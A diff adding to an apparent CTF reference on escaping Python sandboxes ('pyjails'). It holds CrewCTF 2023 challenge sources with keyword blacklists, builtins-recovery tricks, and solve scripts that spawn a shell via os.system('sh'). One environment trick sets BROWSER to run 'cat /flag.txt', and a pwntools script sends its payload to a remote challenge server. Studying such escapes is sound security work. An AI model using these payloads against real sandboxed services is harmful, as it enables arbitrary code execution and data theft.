@@ -24,7 +24,10 @@ __import__.__self__
 # obtain builtins from site-module constants
 # https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module
 help.__call__.__builtins__ # or __globals__
+help.__repr__.__globals__["sys"] #
 license.__repr__.__builtins__ # or __globals__
+license.__repr__.__globals__["sys"] #
+
 
 # obtain the builtins from a defined function
 func.__globals__['__builtins__']
@@ -247,6 +250,8 @@ print(delete_me) # error
 ### environment variables
 - https://www.elttam.com/blog/env/#python
 - `PYTHONINSPECT`, `PYTHONHOME`, `PYTHONPATH`, `PYTHONWARNINGS`, `BROWSER`
+    - `help.__repr__.__globals__["sys"].modules["os"].environ.__setitem__("PYTHONINSPECT", "1")`
+    - `help.__repr__.__builtins__["__import__"]('antigravity', help.__repr__.__builtins__["setattr"](help.__repr__.__builtins__["__import__"]('os'),'environ',{}.__class__(BROWSER='/bin/sh -c "cat /flag.txt" #%s')))` - ref: https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html
 
 ### magic methods
 - https://rszalski.github.io/magicmethods/#appendix1
@@ -1044,6 +1049,93 @@ p.interactive()
 ```
 
 ### CrewCTF 2023: starship
+- `server.py`
+```py
+#!/usr/bin/env python
+import re
+import sys
+
+
+class Nobuffers:
+    def __init__(self, stream, limit=1024):
+        self.stream = stream
+        self.limit = limit
+
+    def write(self, data):
+        if len(data) > self.limit:
+            raise ValueError(f"Data exceeds the maximum limit of {self.limit} characters")
+        self.stream.write(data)
+        self.stream.flush()
+
+    def writelines(self, datas):
+        datas = [f"{data}\n" for data in datas if len(data) <= self.limit]
+        self.stream.writelines(datas)
+        self.stream.flush()
+
+    def __getattr__(self, attr):
+        return getattr(self.stream, attr)
+
+
+blacklisted_chars = re.escape('\\(~}?>{)&/%`<$|*=#!-@+"\'0123456789;')
+blacklisted_words = [
+    'unicode', 'name', 'setattr', 'import', 'open', 'enum',
+    'char', 'quit', 'getattr', 'locals', 'globals', 'len',
+    'exit', 'exec', 'blacklisted_words', 'print', 'builtins',
+    'eval', 'blacklisted_chars', 'repr', 'main', 'subclasses', 'file',
+    'class', 'mro', 'input', 'compile', 'init', 'doc', 'fork',
+    'popen', 'read', 'map', 'dir', 'help', 'error', 'warning',
+    'func_globals', 'vars', 'filter', 'debug', 'object', 'next',
+    'word', 'base', 'prompt', 'breakpoint', 'class', 'pass',
+    'chr', 'ord', 'iter', 'banned'
+]
+blacklisted_unicode = [
+    '\u202e', '\u2060', '\u200f', '\u202a', '\u202b', '\u202c'
+    '\u202d', '\u202f', '\u2061', '\u2062', '\u2063', '\u2064', '\ufeff'
+]
+
+blacklisted_chars = f'[{blacklisted_chars}]'
+blacklisted_words = '|'.join(f'({word})' for word in blacklisted_words)
+blacklisted_unicode_pattern = '|'.join(blacklisted_unicode)
+blacklisted_nonascii = '[^\x00-\x7F]'
+
+stdout = Nobuffers(sys.stdout)
+stdout.write('''
+
+        __..,,-----l"|-.
+    __/"__  |----""  |  i--voo..,,__
+ .-'=|:|/\|-------o.,,,---. Y88888888o,,_
+_+=:_|_|__|_|   ___|__|___-|  """"````"""`----------.........___
+__============:' "" |==|__\===========(=>=+    |           ,_, .-"`--..._
+  ;="|"|  |"| `.____|__|__/===========(=>=+----+===-|---------<---------_=-
+ | ==|:|\/| |   | o|.-'__,-|   .'  _______|o  `----'|        __\ __,.-'"
+  "`--""`--"'"""`.-+------'" .'  _L___,,...-----------"""""""   "
+                  `------""""""""
+
+''')
+
+stdout.write('Enter command: ')
+prompt = input()
+
+prompt = prompt.encode('unicode-escape').decode('ascii')
+prompt = bytes(prompt, 'ascii').decode('unicode-escape')
+
+if re.findall(blacklisted_chars, prompt):
+    raise Exception('Blacklisted character detected. Go away!')
+
+if re.findall(blacklisted_words, prompt, re.I):
+    raise Exception('Blacklisted word detected. Go away!')
+
+if re.search(blacklisted_unicode_pattern, prompt):
+    raise Exception('Blacklisted unicode detected. Go away!')
+
+if re.search(blacklisted_nonascii, prompt):
+    raise Exception('Non-ASCII character detected. Go away!')
+
+try:
+    exec(prompt)
+except:
+    pass
+```
 - `solve.py`
 ```py
 # @quasar - setting sys.stdout.flush to breakpoint
@@ -1051,9 +1143,105 @@ p.interactive()
 
 # @st4rn - os.system("sh")
 [[re.A[i] for re.RegexFlag.__getitem__ in [[[re.A[i] for re.RegexFlag.__getitem__ in [sys.modules.get]] for i in [[[re.A[i] for re.RegexFlag.__getitem__ in [str]] for i in [re.A[[i for i in [re.X.value^re.U.value^re.M.value^re.L.value^re.I.value^re.T.value, re.X.value^re.U.value^re.S.value^re.I.value^re.T.value]]] for re.RegexFlag.__getitem__ in [bytearray]]][re.A.value^re.A.value][re.A.value^re.A.value][re.M.value^re.L.value:re.I.value^re.L.value^re.M.value]]][re.A.value^re.A.value][re.A.value^re.A.value].system]] for i in [[[re.A[i] for re.RegexFlag.__getitem__ in [str]] for i in [re.A[[i for i in [re.X.value^re.U.value^re.S.value^re.I.value^re.T.value, re.X.value^re.U.value^re.M.value]]] for re.RegexFlag.__getitem__ in [bytearray]]][re.A.value^re.A.value][re.A.value^re.A.value][re.M.value^re.L.value:re.I.value^re.L.value^re.M.value]]]
+
+# @Satoooon
+from pwn import *
+
+payload = ""
+# get builtins
+payload += "for b in [sys.modules[[k for k in sys.modules][True]]]:None\r"
+# get input()
+payload += "for ks in [[k for k in b.__dict__]]:None\r"
+payload += "for ks in [ks[True:]]:None\r" * 28
+payload += "for inp in [b.__dict__[ks[False]]]:None\r"
+# create "exec"
+payload += "for Nobuffers.__getitem__ in [inp]:None\r"
+payload += "for s in [stdout[None]]:None\r"
+# get exec()
+payload += "for exc in [b.__dict__[s]]:None\r"
+# exec(input())
+payload += "for v in [stdout[None]]:None\r"
+payload += "for Nobuffers.__getitem__ in [exc]:None\r"
+payload += "stdout[v]"
+
+# io = process(["python3","./chall.py"])
+io = remote("starship.chal.crewc.tf", 40002)
+io.sendline(payload)
+io.sendline("exec")
+io.sendline("import os; os.system('sh')")
+
+io.interactive()
 ```
 
 ### CrewCTF 2023: setjail
+- `main.py`
+```py
+import re
+import ast
+
+import void # void module contains an ascii art string
+
+"""
+Example:
+
+( when root object is A )
+path: .B.C["D"][1][2][3]
+value: "pyjail is fun!"
+
+->
+
+A.B.C["D"][1][2][3] = "pyjail is fun!"
+
+"""
+
+DISALLOWED_WORDS = ["os", "posix"]
+ROOT_OBJECT = void
+
+def abort(s):
+	print(s)
+	exit(1)
+
+def to_value(s):
+	return ast.literal_eval(s)
+
+# gift
+module = input("import: ")
+__import__(module)
+
+path = input("path: ")
+value = to_value(input("value: "))
+
+path, _, last_item_key, last_attr_key = re.match(r"(.*)(\[(.*)\]|\.(.*))", path).groups()
+
+# set root object
+current_obj = ROOT_OBJECT
+
+# walk object
+while path != "":
+	_, item_key, attr_key, path = re.match(r"(\[(.*?)\]|\.([^\.\[]*))(.*)", path).groups()
+
+	if item_key is not None:
+		item_key = to_value(item_key)
+		if any([word in item_key for word in DISALLOWED_WORDS]):
+			abort("deny")
+		current_obj = current_obj[item_key]
+	elif attr_key is not None:
+		if any([word in attr_key for word in DISALLOWED_WORDS]):
+			abort("deny")
+		current_obj = getattr(current_obj, attr_key)
+	else:
+		abort("invalid")
+
+
+# set value
+if last_item_key is not None:
+	last_item_key = to_value(last_item_key)
+	current_obj[last_item_key] = value
+elif last_attr_key is not None:
+	setattr(current_obj, last_attr_key, value)
+
+print("Done")
+```
 - `solve.py`
 ```py
 # @Satoooon - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
@@ -1068,6 +1256,49 @@ path: .__builtins__["help"].__repr__.__globals__["sys"].modules["__main__"].DISA
 value: []
 path: .__builtins__["help"].__repr__.__globals__["sys"].modules["os"].environ["PYTHONINSPECT"]
 value: "1"
+```
+
+### CrewCTF 2023: jailpie
+- `server.py`
+```py
+#!/usr/local/bin/python3
+import base64
+import types
+import dis
+
+def is_valid(code):
+    whitelist = {
+        'LOAD_CONST',
+        'BINARY_OP',
+        'COMPARE_OP',
+        'POP_JUMP_BACKWARD_IF_TRUE',
+        'RETURN_VALUE',
+    }
+
+    for instr in dis.Bytecode(code):
+        if instr.opname not in whitelist:
+            return False
+
+        if 'JUMP' in instr.opname and not (0 <= instr.argval < len(code.co_code)):
+            return False
+
+    return True
+
+if __name__ == '__main__':
+    _print, _eval = print, eval
+    # try:
+    prog = bytes.fromhex(input('Program: '))
+    code = types.CodeType(0, 0, 0, 0, 0, 0, prog, (0,), (), (), '', '', '', 0, b'', b'', (), ())
+    assert is_valid(code)
+
+    __builtins__.__dict__.clear()
+    _print(_eval(code, {}))
+    # except:
+    #     _print('Nice try!')
+```
+- `solve.py`
+```py
+# TBA
 ```
 
 ### SEETF 2023: Another PyJail
